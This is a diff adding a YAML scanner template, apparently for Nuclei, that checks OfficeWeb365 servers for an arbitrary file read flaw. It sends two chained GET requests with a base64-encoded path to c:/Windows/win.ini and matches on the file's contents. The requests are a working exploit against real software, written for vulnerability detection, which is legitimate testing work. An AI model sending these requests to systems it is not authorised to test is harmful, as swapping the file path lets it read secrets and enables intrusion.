@@ -1,0 +1,57 @@
+id: poc-yaml-officeweb365-wordfix-anyfile-read
+info:
+  name: OfficeWeb365 Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+variables:
+  img: ""
+
+flow: http(1) && http(2)
+
+http:
+  - id: step-1
+    method: GET
+    path:
+      - "{{BaseURL}}/wordfix/Index?f=YzovV2luZG93cy93aW4uaW5p"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "OfficeWeb365"
+    extractors:
+      - type: regex
+        name: img
+        group: 1
+        internal: true
+        part: body
+        regex:
+          - "id=\"Img\" value=\"(?P<img>.*?)\""
+  
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/WordFix/GetNext/?f=YzovV2luZG93cy93aW4uaW5p&img={{img}}&isIE8=false"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[files]"
+          - "[fonts]"
+      - type: word
+        part: header
+        words:
+          - "OfficeWeb365"
+      - type: word
+        part: header
+        words:
+          - "application/json"
